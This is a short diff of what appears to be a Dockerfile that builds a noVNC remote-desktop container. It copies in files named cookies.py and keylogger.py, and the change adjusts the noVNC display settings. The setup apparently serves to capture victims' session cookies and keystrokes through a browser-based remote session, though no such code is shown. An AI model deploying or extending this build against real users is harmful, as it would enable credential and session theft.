@@ -62,7 +62,9 @@ COPY Files/cookies.py /home/user/
 COPY Files/keylogger.py /home/user/
 COPY Files/vnc_lite.html /home/user/noVNC/
 COPY Files/cursor.js /home/user/noVNC/core/util/
-COPY Files/rfb.js /home/user/noVNC/core/
+RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js
+RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
+RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js
 COPY Files/ui.js /home/user/noVNC/app/
 COPY Files/kiosk.zip /home/user/
 COPY Files/index.php /home/user/
